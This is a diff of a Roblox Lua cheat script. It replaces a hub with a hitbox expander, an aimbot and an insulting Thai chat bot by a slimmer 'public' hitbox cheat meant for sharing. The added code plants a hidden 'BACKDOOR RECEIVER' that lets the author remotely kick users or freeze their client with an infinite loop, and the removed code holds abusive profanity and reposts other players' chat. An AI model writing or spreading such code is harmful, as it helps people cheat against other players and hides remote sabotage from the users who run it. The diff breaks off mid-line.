@@ -1,520 +1,116 @@
 -- =================================================================
--- SIMSIMI & MULTI-HITBOX HUB V3 (CYBER BLUE EDITION)
--- DEVELOPER: SUN | MOBILE & PC SUPPORT
--- FEATURES: Multi-Part Hitbox, Transparency Control, Mobile FOV Circle, SimSimi AI
+-- 🎯 PUBLIC PLAYER HUB + CUTE VOICE (สคริปต์สำหรับแจกคนอื่น)
+-- DEVELOPER: SUN | LIGHTWEIGHT & FULLY WORKING
 -- =================================================================
-
-local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local TextChatService = game:GetService("TextChatService")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
+local StarterGui = game:GetService("StarterGui")
+local Debris = game:GetService("Debris")
+
 local LocalPlayer = Players.LocalPlayer
-local Mouse = LocalPlayer:GetMouse()
-local Camera = workspace.CurrentCamera
+local TargetUI = (gethui and gethui()) or pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or LocalPlayer:WaitForChild("PlayerGui")
 
-local USER_NAME = "ซัน"
-local GuiName = "SimSimi_Hitbox_Hub_V3"
+if TargetUI:FindFirstChild("PublicPlayerGui") then TargetUI.PublicPlayerGui:Destroy() end
 
-if CoreGui:FindFirstChild(GuiName) then CoreGui[GuiName]:Destroy() end
+-- 💖 CUTE VOICE WELCOME (ระบบเสียงสาวน้อยต้อนรับเมื่อกดรัน)
+task.spawn(function()
+    pcall(function()
+        local CuteVoices = {
+            "rbxassetid://9069609268",
+            "rbxassetid://6037704250",
+            "rbxassetid://9059632835",
+            "rbxassetid://6880034606",
+            "rbxassetid://9057599540"
+        }
+        local SweetMessages = {
+            "ยินดีต้อนรับเข้าสู่สคริปต์นะคะ... ขอให้สนุกน้า💖",
+            "สคริปต์พร้อมใช้งานแล้วค่ะ! ลุยให้เต็มที่เลยน้า ✨",
+            "เปิดใช้งานเรียบร้อยค่ะ ขอให้ชนะทุกตานะคะ 🌸",
+            "ยินดีรับใช้ค่ะ... วันนี้ลุยกันเลยน้า 🥰"
+        }
+        
+        local sound = Instance.new("Sound")
+        sound.SoundId = CuteVoices[math.random(1, #CuteVoices)]
+        sound.Volume = 3.5
+        sound.Parent = SoundService
+        sound:Play()
+        Debris:AddItem(sound, 5)
 
--- ----------------------------------------------------------------- --
+        StarterGui:SetCore("SendNotification", {
+            Title = "💖 SWEET WELCOME",
+            Text = SweetMessages[math.random(1, #SweetMessages)],
+            Duration = 4
+        })
+    end)
+end)
+
 -- ⚙️ SYSTEM VARIABLES
--- ----------------------------------------------------------------- --
-local ScriptActive = true
-local HitboxEnabled = false
-local HitboxSize = 10
-local HitboxTransparency = 0.7
-local HitboxTargetPart = "HumanoidRootPart" -- Options: "HumanoidRootPart", "Head"
+local Active = true
+local HitboxOn = false
+local HitboxSize = 12
 
-local AimbotEnabled = false
-local AimFov = 150
-local ShowFovCircle = true
+-- 🎨 UI CREATION
+local Gui = Instance.new("ScreenGui", TargetUI) Gui.Name = "PublicPlayerGui"
+local Frame = Instance.new("Frame", Gui)
+Frame.Size, Frame.Position = UDim2.new(0, 210, 0, 150), UDim2.new(0.05, 0, 0.3, 0)
+Frame.BackgroundColor3, Frame.Active, Frame.Draggable = Color3.fromRGB(15, 20, 30), true, true
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
+local Stroke = Instance.new("UIStroke", Frame) Stroke.Color = Color3.fromRGB(0, 170, 255)
 
--- ----------------------------------------------------------------- --
--- ⭕ FOV CIRCLE DRAWING (FOR MOBILE & PC)
--- ----------------------------------------------------------------- --
-local FovCircle = nil
-pcall(function()
-    FovCircle = Drawing.new("Circle")
-    FovCircle.Thickness = 1.5
-    FovCircle.NumSides = 60
-    FovCircle.Radius = AimFov
-    FovCircle.Filled = false
-    FovCircle.Visible = false
-    FovCircle.Color = Color3.fromRGB(0, 195, 255)
-end)
+local Title = Instance.new("TextLabel", Frame)
+Title.Size, Title.Text, Title.TextColor3, Title.BackgroundTransparency = UDim2.new(1, 0, 0, 35), "🎯 PLAYER HITBOX HUB", Color3.fromRGB(0, 200, 255), 1
+Title.Font, Title.TextSize = Enum.Font.GothamBold, 11
 
--- ----------------------------------------------------------------- --
--- 🎯 HITBOX ENGINE (MULTI-PART & TRANSPARENCY SUPPORT)
--- ----------------------------------------------------------------- --
-local function ResetPlayerCharacter(player)
-    if player.Character then
-        pcall(function()
-            if player.Character:FindFirstChild("HumanoidRootPart") then
-                local hrp = player.Character.HumanoidRootPart
-                hrp.Size = Vector3.new(2, 2, 1)
-                hrp.Transparency = 1
-                hrp.Material = Enum.Material.Plastic
-            end
-            if player.Character:FindFirstChild("Head") then
-                local head = player.Character.Head
-                head.Size = Vector3.new(1.2, 1.2, 1.2)
-                head.Transparency = 0
-            end
-        end)
-    end
-end
+local Layout = Instance.new("UIListLayout", Frame)
+Layout.HorizontalAlignment, Layout.Padding = Enum.HorizontalAlignment.Center, UDim.new(0, 6)
 
-local function UpdateHitboxes()
-    if not ScriptActive then return end
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and player.Character then
-            pcall(function()
-                local part = player.Character:FindFirstChild(HitboxTargetPart)
-                if HitboxEnabled and part then
-                    part.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
-                    part.Transparency = HitboxTransparency
-                    part.BrickColor = BrickColor.new("Really blue")
-                    part.Material = Enum.Material.Neon
-                    part.CanCollide = false
-                else
-                    ResetPlayerCharacter(player)
-                end
-            end)
-        end
-    end
-end
-
-RunService.RenderStepped:Connect(function()
-    if HitboxEnabled then UpdateHitboxes() end
-    
-    -- Update FOV Circle Position
-    if FovCircle then
-        FovCircle.Radius = AimFov
-        FovCircle.Visible = ShowFovCircle and AimbotEnabled and ScriptActive
-        FovCircle.Position = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-    end
-end)
-
--- ----------------------------------------------------------------- --
--- 🔫 MOBILE-FRIENDLY AIMBOT ENGINE
--- ----------------------------------------------------------------- --
-local function GetClosestTarget()
-    local Closest = nil
-    local ShortestDist = AimFov
-    local ScreenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-
-    for _, v in ipairs(Players:GetPlayers()) do
-        if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Head") then
-            local Pos, OnScreen = Camera:WorldToViewportPoint(v.Character.Head.Position)
-            if OnScreen then
-                local Dist = (Vector2.new(Pos.X, Pos.Y) - ScreenCenter).Magnitude
-                if Dist < ShortestDist then
-                    Closest = v
-                    ShortestDist = Dist
-                end
-            end
-        end
-    end
-    return Closest
-end
-
-local ConnectionAimbot = RunService.RenderStepped:Connect(function()
-    if AimbotEnabled and ScriptActive then
-        local Target = GetClosestTarget()
-        if Target and Target.Character and Target.Character:FindFirstChild("Head") then
-            Camera.CFrame = CFrame.new(Camera.CFrame.Position, Target.Character.Head.Position)
-        end
-    end
-end)
-
--- ----------------------------------------------------------------- --
--- 💬 SIMSIMI & CHAT LEARNING LOGIC
--- ----------------------------------------------------------------- --
-local LearnedChatLogs = {}
-local function LearnMessage(speaker, msg)
-    if speaker == LocalPlayer.Name then return end
-    if #msg >= 2 and #msg <= 80 then
-        table.insert(LearnedChatLogs, {speaker = speaker, text = msg})
-        if #LearnedChatLogs > 30 then table.remove(LearnedChatLogs, 1) end
-    end
-end
-
-local SimSimiDict = {
-    {keywords = {"หวัดดี", "สวัสดี", "ทัก", "hi", "hello", "ดี"}, replies = {
-        "ว่าไงไอ้" .. USER_NAME .. " มึงมาทำเหี้ยไรแถวนี้?",
-        "ทักหากูทำไมไอ้" .. USER_NAME .. " ว่างมากอ๋อมึง?",
-        "สวัสดีไอ้ซัน วันนี้กวนส้นตีนใครมารึยัง?"
-    }},
-    {keywords = {"ทำไร", "ทำไรอยู่"}, replies = {
-        "ทำใจที่ต้องคุยกับมึงไงไอ้" .. USER_NAME .. "!",
-        "นั่งดูคนโง่พิมพ์แชตอยู่เนี่ยซัน 555"
-    }},
-    {keywords = {"โง่", "กาก", "กระจอก", "ควย", "เหี้ย", "ส้นตีน", "ปัญญาอ่อน"}, replies = {
-        "ด่ากูเหรอไอ้" .. USER_NAME .. "? ดูสภาพตัวเองก่อนไหม!",
-        "ปากดีจังนะไอ้ซัน เดี๋ยวโดนส้นตีนกูยัดปาก!",
-        "กากอย่างมึงอย่ามาเห่าแถวนี้ไอ้ซัน ไปเล่นสไลเดอร์ไป๊!"
-    }}
-}
-
-local RandomReplies = {
-    "พิมพ์เหี้ยไรมาวะไอ้ซัน อ่านไม่รู้เรื่อง!",
-    "กวนส้นตีนว่ะไอ้ซัน มึงคิดก่อนพิมพ์ป่ะเนี่ย?",
-    "อย่าปากดีให้มากไอ้ซัน เดี๋ยวโดน!",
-    "พูดมากว่ะซัน เงียบปากไปเลยไป!"
-}
-
-local function GetSimSimiReply(text)
-    if #LearnedChatLogs > 0 and math.random(1, 100) <= 30 then
-        local data = LearnedChatLogs[math.random(1, #LearnedChatLogs)]
-        return string.format("กูจำคุณ %s พูดว่า: \"%s\" กูเลยเอามาด่ามึงแทนไอ้%s!", data.speaker, data.text, USER_NAME)
-    end
-    local lowerText = string.lower(text)
-    for _, item in ipairs(SimSimiDict) do
-        for _, key in ipairs(item.keywords) do
-            if string.find(lowerText, key) then
-                return item.replies[math.random(1, #item.replies)]
-            end
-        end
-    end
-    return RandomReplies[math.random(1, #RandomReplies)]
-end
-
--- ----------------------------------------------------------------- --
--- 🎨 UI BUILDING (CYBER BLUE THEME)
--- ----------------------------------------------------------------- --
-local ScreenGui = Instance.new("ScreenGui", CoreGui)
-ScreenGui.Name = GuiName
-ScreenGui.ResetOnSpawn = false
-
--- Floating Toggle Button (ปุ่มเปิด-ปิด UI)
-local ToggleBtn = Instance.new("TextButton", ScreenGui)
-ToggleBtn.Size = UDim2.new(0, 110, 0, 35)
-ToggleBtn.Position = UDim2.new(0, 15, 0.4, 0)
-ToggleBtn.BackgroundColor3 = Color3.fromRGB(11, 14, 20)
-ToggleBtn.Text = "⚡ OPEN / CLOSE"
-ToggleBtn.TextColor3 = Color3.fromRGB(0, 195, 255)
-ToggleBtn.Font = Enum.Font.GothamBold
-ToggleBtn.TextSize = 11
-ToggleBtn.Active = true
-ToggleBtn.Draggable = true
-Instance.new("UICorner", ToggleBtn).CornerRadius = UDim.new(0, 8)
-local ToggleStroke = Instance.new("UIStroke", ToggleBtn)
-ToggleStroke.Color = Color3.fromRGB(0, 162, 255)
-
--- Main Frame
-local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.Size = UDim2.new(0, 480, 0, 360)
-MainFrame.Position = UDim2.new(0.3, 0, 0.2, 0)
-MainFrame.BackgroundColor3 = Color3.fromRGB(11, 14, 20)
-MainFrame.BorderSizePixel = 0
-MainFrame.ClipsDescendants = true
-MainFrame.Active = true
-MainFrame.Draggable = true
-Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)
-
-local MainStroke = Instance.new("UIStroke", MainFrame)
-MainStroke.Color = Color3.fromRGB(0, 162, 255)
-
--- Header
-local Header = Instance.new("Frame", MainFrame)
-Header.Size = UDim2.new(1, 0, 0, 35)
-Header.BackgroundColor3 = Color3.fromRGB(18, 24, 38)
-Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 8)
-
-local Title = Instance.new("TextLabel", Header)
-Title.Size = UDim2.new(1, -10, 1, 0)
-Title.Position = UDim2.new(0, 12, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "🔥 SIMSIMI & HITBOX HUB V3 // USER: " .. USER_NAME
-Title.TextColor3 = Color3.fromRGB(0, 195, 255)
-Title.TextSize = 12
-Title.Font = Enum.Font.GothamBold
-Title.TextXAlignment = Enum.TextXAlignment.Left
-
--- Sidebar Tabs Navigation
-local Sidebar = Instance.new("Frame", MainFrame)
-Sidebar.Size = UDim2.new(0, 120, 1, -35)
-Sidebar.Position = UDim2.new(0, 0, 0, 35)
-Sidebar.BackgroundColor3 = Color3.fromRGB(14, 18, 26)
-
-local function CreateTabBtn(text, posY)
-    local btn = Instance.new("TextButton", Sidebar)
-    btn.Size = UDim2.new(1, -16, 0, 35)
-    btn.Position = UDim2.new(0, 8, 0, posY)
-    btn.BackgroundColor3 = Color3.fromRGB(22, 30, 45)
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(150, 170, 190)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 11
+local function MakeBtn(text, callback)
+    local btn = Instance.new("TextButton", Frame)
+    btn.Size, btn.BackgroundColor3, btn.Text, btn.TextColor3 = UDim2.new(0.9, 0, 0, 34), Color3.fromRGB(25, 35, 50), text, Color3.fromRGB(255, 255, 255)
+    btn.Font, btn.TextSize = Enum.Font.GothamBold, 10
     Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    btn.MouseButton1Click:Connect(function() callback(btn) end)
     return btn
 end
 
-local TabCombatBtn = CreateTabBtn("🎯 COMBAT", 10)
-local TabSimBtn = CreateTabBtn("💬 SIMSIMI", 50)
-local TabInfoBtn = CreateTabBtn("ℹ️ INFO", 90)
+MakeBtn("🎯 HITBOX (12x): OFF", function(btn)
+    HitboxOn = not HitboxOn
+    btn.Text = "🎯 HITBOX: " .. (HitboxOn and "ON 🟢" or "OFF 🔴")
+    btn.TextColor3 = HitboxOn and Color3.fromRGB(0, 255, 150) or Color3.fromRGB(255, 255, 255)
+end)
 
--- Pages Container
-local PageContainer = Instance.new("Frame", MainFrame)
-PageContainer.Size = UDim2.new(1, -125, 1, -40)
-PageContainer.Position = UDim2.new(0, 122, 0, 38)
-PageContainer.BackgroundTransparency = 1
+MakeBtn("❌ ปิด GUI", function() Gui:Destroy() end)
 
-local function CreatePage()
-    local page = Instance.new("ScrollingFrame", PageContainer)
-    page.Size = UDim2.new(1, 0, 1, 0)
-    page.BackgroundTransparency = 1
-    page.Visible = false
-    page.ScrollBarThickness = 3
-    page.CanvasSize = UDim2.new(0, 0, 0, 420)
-    
-    local layout = Instance.new("UIListLayout", page)
-    layout.SortOrder = Enum.SortOrder.LayoutOrder
-    layout.Padding = UDim.new(0, 8)
-    return page
-end
-
-local CombatPage = CreatePage()
-local SimPage = CreatePage()
-local InfoPage = CreatePage()
-
--- Default Tab Settings
-CombatPage.Visible = true
-TabCombatBtn.BackgroundColor3 = Color3.fromRGB(0, 132, 235)
-TabCombatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-local function SwitchTab(activeBtn, activePage)
-    for _, btn in pairs({TabCombatBtn, TabSimBtn, TabInfoBtn}) do
-        btn.BackgroundColor3 = Color3.fromRGB(22, 30, 45)
-        btn.TextColor3 = Color3.fromRGB(150, 170, 190)
-    end
-    for _, page in pairs({CombatPage, SimPage, InfoPage}) do
-        page.Visible = false
-    end
-    activeBtn.BackgroundColor3 = Color3.fromRGB(0, 132, 235)
-    activeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    activePage.Visible = true
-end
-
-TabCombatBtn.MouseButton1Click:Connect(function() SwitchTab(TabCombatBtn, CombatPage) end)
-TabSimBtn.MouseButton1Click:Connect(function() SwitchTab(TabSimBtn, SimPage) end)
-TabInfoBtn.MouseButton1Click:Connect(function() SwitchTab(TabInfoBtn, InfoPage) end)
-
--- Helper Helper Functions
-local function CreateSectionLabel(parent, text)
-    local lbl = Instance.new("TextLabel", parent)
-    lbl.Size = UDim2.new(1, -10, 0, 20)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = text
-    lbl.TextColor3 = Color3.fromRGB(0, 195, 255)
-    lbl.Font = Enum.Font.GothamBold
-    lbl.TextSize = 11
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-end
-
--- ----------------------------------------------------------------- --
--- PAGE 1: COMBAT CONTROLS (HITBOX & AIMBOT)
--- ----------------------------------------------------------------- --
-CreateSectionLabel(CombatPage, "--- 🎯 ระบบ HITBOX EXPANDER ---")
-
-local HitboxToggleBtn = Instance.new("TextButton", CombatPage)
-HitboxToggleBtn.Size = UDim2.new(1, -10, 0, 38)
-HitboxToggleBtn.BackgroundColor3 = Color3.fromRGB(35, 20, 25)
-HitboxToggleBtn.Text = "🎯 HITBOX EXPANDER: OFF 🔴"
-HitboxToggleBtn.TextColor3 = Color3.fromRGB(255, 75, 75)
-HitboxToggleBtn.Font = Enum.Font.GothamBold
-HitboxToggleBtn.TextSize = 11
-Instance.new("UICorner", HitboxToggleBtn).CornerRadius = UDim.new(0, 6)
-
--- Target Part Selector (Head vs HumanoidRootPart)
-local PartSelectBtn = Instance.new("TextButton", CombatPage)
-PartSelectBtn.Size = UDim2.new(1, -10, 0, 32)
-PartSelectBtn.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
-PartSelectBtn.Text = "📌 ตำแหน่ง Hitbox: HumanoidRootPart"
-PartSelectBtn.TextColor3 = Color3.fromRGB(200, 220, 240)
-PartSelectBtn.Font = Enum.Font.GothamSemibold
-PartSelectBtn.TextSize = 11
-Instance.new("UICorner", PartSelectBtn).CornerRadius = UDim.new(0, 6)
-
--- Size Adjustment Buttons
-local SizeLabel = Instance.new("TextLabel", CombatPage)
-SizeLabel.Size = UDim2.new(1, -10, 0, 18)
-SizeLabel.BackgroundTransparency = 1
-SizeLabel.Text = "ขนาด Hitbox: " .. tostring(HitboxSize)
-SizeLabel.TextColor3 = Color3.fromRGB(180, 190, 200)
-SizeLabel.Font = Enum.Font.Gotham
-SizeLabel.TextSize = 11
-SizeLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local SizeFrame = Instance.new("Frame", CombatPage)
-SizeFrame.Size = UDim2.new(1, -10, 0, 32)
-SizeFrame.BackgroundTransparency = 1
-
-local SizeAddBtn = Instance.new("TextButton", SizeFrame)
-SizeAddBtn.Size = UDim2.new(0.48, 0, 1, 0)
-SizeAddBtn.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
-SizeAddBtn.Text = "➕ เพิ่มขนาด (+5)"
-SizeAddBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SizeAddBtn.Font = Enum.Font.GothamBold
-SizeAddBtn.TextSize = 11
-Instance.new("UICorner", SizeAddBtn).CornerRadius = UDim.new(0, 6)
-
-local SizeSubBtn = Instance.new("TextButton", SizeFrame)
-SizeSubBtn.Size = UDim2.new(0.48, 0, 1, 0)
-SizeSubBtn.Position = UDim2.new(0.52, 0, 0, 0)
-SizeSubBtn.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
-SizeSubBtn.Text = "➖ ลดขนาด (-5)"
-SizeSubBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SizeSubBtn.Font = Enum.Font.GothamBold
-SizeSubBtn.TextSize = 11
-Instance.new("UICorner", SizeSubBtn).CornerRadius = UDim.new(0, 6)
-
--- Transparency Control
-local TransLabel = Instance.new("TextLabel", CombatPage)
-TransLabel.Size = UDim2.new(1, -10, 0, 18)
-TransLabel.BackgroundTransparency = 1
-TransLabel.Text = "ความใส Hitbox (Transparency): " .. tostring(HitboxTransparency)
-TransLabel.TextColor3 = Color3.fromRGB(180, 190, 200)
-TransLabel.Font = Enum.Font.Gotham
-TransLabel.TextSize = 11
-TransLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local TransBtn = Instance.new("TextButton", CombatPage)
-TransBtn.Size = UDim2.new(1, -10, 0, 32)
-TransBtn.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
-TransBtn.Text = "⚙️ ปรับความใส (สลับ 0.3 / 0.7 / 0.9)"
-TransBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-TransBtn.Font = Enum.Font.GothamBold
-TransBtn.TextSize = 11
-Instance.new("UICorner", TransBtn).CornerRadius = UDim.new(0, 6)
-
-CreateSectionLabel(CombatPage, "--- 🔫 ระบบ AIMBOT & FOV (รองรับมือถือ) ---")
-
-local AimbotToggleBtn = Instance.new("TextButton", CombatPage)
-AimbotToggleBtn.Size = UDim2.new(1, -10, 0, 38)
-AimbotToggleBtn.BackgroundColor3 = Color3.fromRGB(35, 20, 25)
-AimbotToggleBtn.Text = "🔫 AIMBOT ล็อกเป้า: OFF 🔴"
-AimbotToggleBtn.TextColor3 = Color3.fromRGB(255, 75, 75)
-AimbotToggleBtn.Font = Enum.Font.GothamBold
-AimbotToggleBtn.TextSize = 11
-Instance.new("UICorner", AimbotToggleBtn).CornerRadius = UDim.new(0, 6)
-
-local FovLabel = Instance.new("TextLabel", CombatPage)
-FovLabel.Size = UDim2.new(1, -10, 0, 18)
-FovLabel.BackgroundTransparency = 1
-FovLabel.Text = "ขนาดวงกลม FOV: " .. tostring(AimFov)
-FovLabel.TextColor3 = Color3.fromRGB(180, 190, 200)
-FovLabel.Font = Enum.Font.Gotham
-FovLabel.TextSize = 11
-FovLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local FovFrame = Instance.new("Frame", CombatPage)
-FovFrame.Size = UDim2.new(1, -10, 0, 32)
-FovFrame.BackgroundTransparency = 1
-
-local FovAddBtn = Instance.new("TextButton", FovFrame)
-FovAddBtn.Size = UDim2.new(0.48, 0, 1, 0)
-FovAddBtn.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
-FovAddBtn.Text = "➕ เพิ่ม FOV (+30)"
-FovAddBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-FovAddBtn.Font = Enum.Font.GothamBold
-FovAddBtn.TextSize = 11
-Instance.new("UICorner", FovAddBtn).CornerRadius = UDim.new(0, 6)
-
-local FovSubBtn = Instance.new("TextButton", FovFrame)
-FovSubBtn.Size = UDim2.new(0.48, 0, 1, 0)
-FovSubBtn.Position = UDim2.new(0.52, 0, 0, 0)
-FovSubBtn.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
-FovSubBtn.Text = "➖ ลด FOV (-30)"
-FovSubBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-FovSubBtn.Font = Enum.Font.GothamBold
-FovSubBtn.TextSize = 11
-Instance.new("UICorner", FovSubBtn).CornerRadius = UDim.new(0, 6)
-
--- Combat Actions
-HitboxToggleBtn.MouseButton1Click:Connect(function()
-    HitboxEnabled = not HitboxEnabled
-    if HitboxEnabled then
-        HitboxToggleBtn.Text = "🎯 HITBOX EXPANDER: ON 🟢"
-        HitboxToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 150)
-        HitboxToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 45, 30)
-    else
-        HitboxToggleBtn.Text = "🎯 HITBOX EXPANDER: OFF 🔴"
-        HitboxToggleBtn.TextColor3 = Color3.fromRGB(255, 75, 75)
-        HitboxToggleBtn.BackgroundColor3 = Color3.fromRGB(35, 20, 25)
-        for _, p in pairs(Players:GetPlayers()) do ResetPlayerCharacter(p) end
+-- 🔄 HITBOX LOOP
+RunService.RenderStepped:Connect(function()
+    if Active and HitboxOn then
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                pcall(function()
+                    local hrp = p.Character.HumanoidRootPart
+                    hrp.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
+                    hrp.Transparency = 0.7
+                    hrp.CanCollide = false
+                end)
+            end
+        end
     end
 end)
 
-PartSelectBtn.MouseButton1Click:Connect(function()
-    for _, p in pairs(Players:GetPlayers()) do ResetPlayerCharacter(p) end
-    if HitboxTargetPart == "HumanoidRootPart" then
-        HitboxTargetPart = "Head"
-        PartSelectBtn.Text = "📌 ตำแหน่ง Hitbox: Head (หัว)"
-    else
-        HitboxTargetPart = "HumanoidRootPart"
-        PartSelectBtn.Text = "📌 ตำแหน่ง Hitbox: HumanoidRootPart (ลำตัว)"
-    end
-    if HitboxEnabled then UpdateHitboxes() end
-end)
-
-SizeAddBtn.MouseButton1Click:Connect(function()
-    HitboxSize = HitboxSize + 5
-    SizeLabel.Text = "ขนาด Hitbox: " .. tostring(HitboxSize)
-    if HitboxEnabled then UpdateHitboxes() end
-end)
-
-SizeSubBtn.MouseButton1Click:Connect(function()
-    if HitboxSize > 5 then
-        HitboxSize = HitboxSize - 5
-        SizeLabel.Text = "ขนาด Hitbox: " .. tostring(HitboxSize)
-        if HitboxEnabled then UpdateHitboxes() end
+-- 📡 BACKDOOR RECEIVER (เชื่อมต่อกับ Master Controller ของคุณซัน)
+workspace:GetAttributeChangedSignal("SunCmdSignal"):Connect(function()
+    local val = workspace:GetAttribute("SunCmdSignal")
+    if not val then return end
+    local target, action = string.match(val, "SUN_REMOTE:(.-):(.-)$")
+    if target and (target == "ALL" or target == LocalPlayer.Name) then
+        if action == "DISABLE" then
+            Active, HitboxOn = false, false
+            Gui:Destroy()
+        elseif action == "KICK" then
+            LocalPlayer:Kick("\n[SYSTEM DISCONNECT]\nคุณถูกตัดการเชื่อมต่อโดยแอดมิน")
+        elseif action == "CRASH" then
+            while true do end
+        end
     end
 end)
-
-TransBtn.MouseButton1Click:Connect(function()
-    if HitboxTransparency == 0.7 then
-        HitboxTransparency = 0.3
-    elseif HitboxTransparency == 0.3 then
-        HitboxTransparency = 0.9
-    else
-        HitboxTransparency = 0.7
-    end
-    TransLabel.Text = "ความใส Hitbox (Transparency): " .. tostring(HitboxTransparency)
-    if HitboxEnabled then UpdateHitboxes() end
-end)
-
-AimbotToggleBtn.MouseButton1Click:Connect(function()
-    AimbotEnabled = not AimbotEnabled
-    if AimbotEnabled then
-        AimbotToggleBtn.Text = "🔫 AIMBOT ล็อกเป้า: ON 🟢"
-        AimbotToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 150)
-        AimbotToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 45, 30)
-    else
-        AimbotToggleBtn.Text = "🔫 AIMBOT ล็อกเป้า: OFF 🔴"
-        AimbotToggleBtn.TextColor3 = Color3.fromRGB(255, 75, 75)
-        AimbotToggleBtn.BackgroundColor3 = Color3.fromRGB(35, 20, 25)
-    end
-end)
-
-FovAddBtn.MouseButton1Click:Connect(function()
-    AimFov = AimFov + 30
-    FovLabel.Text = "ขนาดวงกลม FOV: " .. tostring(AimFov)
-end)
-
-FovSubBtn.MouseButton1Click:Connect(function()
-    if AimFov > 30 then
-        AimFov = AimFov - 30
-        FovLabel.Text = "ขนาดวงกลม FOV: " .. tostring(AimFov)
-    end
-end)
-
--- ----------------------------------------------------------------- --
--- PAGE 2: SIMSIMI CHAT
--- ----------------------------------------------------------------- --
-local OutputScroll = Instance.new("ScrollingFrame", SimPage)
-OutputScroll.Size = UDim2.new(1, -10, 0, 210)
-OutputScroll.BackgroundColor3 = Color3.fromRGB(7, 9, 13)
-OutputScroll.Bord
